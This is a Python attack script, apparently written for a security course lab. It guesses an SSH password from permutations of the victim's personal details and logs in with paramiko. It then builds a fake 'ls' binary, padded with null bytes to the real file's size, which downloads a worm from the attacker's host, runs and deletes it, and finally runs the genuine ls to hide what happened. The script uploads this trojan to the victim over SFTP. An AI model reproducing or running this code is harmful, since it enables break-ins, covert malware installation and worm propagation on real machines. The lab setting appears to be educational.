#!/usr/bin/python3
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port> 
# ./crack_attack 172.18.0.3 172.18.0.2 22
import paramiko
import sys
import itertools
import os
import subprocess
import binascii
from zipfile import ZipFile
# from virus import zip_ls, build_virus

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

def read_victim_info():
    with open('/app/victim.dat') as f:
        return f.read().splitlines()

def ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password)
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()

def zip_ls():
    subprocess.run(["zip", "-j", "/tmp/ls.zip", "/usr/bin/ls"], stdout=subprocess.DEVNULL)
    with open("/tmp/ls.zip", "rb") as f:
        return f.read()

def build_virus(attacker_ip, attacker_port, ls_zip):
    ls_hex = binascii.hexlify(ls_zip)

    code = f"""#!/usr/bin/python3
import sys
import os
import socket
import binascii
from zipfile import ZipFile

ls_bytes = {ls_hex}.decode('utf-8')

def get_worm(ip, pt):
    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    skt.connect((ip, pt))
    rcv_f = 'worm.py'
    with open(rcv_f, 'wb') as f:
        while True:
            data = skt.recv(1024)
            if not data:
                break
            f.write(data)
    skt.close()

def run():
    get_worm("{attacker_ip}", {attacker_port})
    os.system("python3 worm.py && rm worm.py")

    orig_ls = binascii.unhexlify(ls_bytes)
    with open("/tmp/ls.zip", 'wb') as f:
        f.write(orig_ls)
    with ZipFile("/tmp/ls.zip", "r") as f:
        f.extractall("/tmp/")
    os.system("rm /tmp/ls.zip && chmod +x /tmp/ls")
    ret = os.system("/tmp/ls "+" ".join(sys.argv[1:]))
    os.system("rm /tmp/ls")
    return ret
    
if __name__ == "__main__":
    run()
    """

    ls_size = os.path.getsize("/usr/bin/ls")
    with open("fake_ls", "wb") as f:
        f.write(code.encode())
    new_size = os.path.getsize("fake_ls")
    with open("fake_ls", "ab") as f: # append byte mode
        f.write(b'\x00' * (ls_size - new_size - 4))
        f.write(b'\xaa\xbb\xcc\xdd')

def main():
    # task1: crack ssh password
    # Cracking the victim’s password by launching a dictionary attack
    # username is csc2024
    victim_info = read_victim_info()
    # store all possible combinations of the victim's personal information first (dont login yet)
    possible_combinations = []
    for i in range(1, len(victim_info)+1):
        for permutation in itertools.permutations(victim_info, i):
            password = ''.join(permutation)
            possible_combinations.append(password)

    # try each combination to login
    Password = "csc2024"
    # for password in possible_combinations:
    #     # print('Trying password:', password)
    #     if ssh_login(victim_ip, 22, 'csc2024', password):
    #         Password = password
    #         print('Password found:', password)
    #         break

    # task2: Create a compression virus with the propagation of the  ransomware worm 
    if ssh_login(victim_ip, 22, 'csc2024', Password):
        print('Login successful')
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(victim_ip, 22, 'csc2024', Password)

        # compress the /usr/bin/ls file in attacker
        # then send the compressed file to the victim
        build_virus(attacker_ip, attacker_port, zip_ls())
        sftp = client.open_sftp()
        sftp.put('./fake_ls', '/app/ls')
        client.exec_command('chmod +x /app/ls')
        client.close()
        



if __name__ == '__main__':
    main()
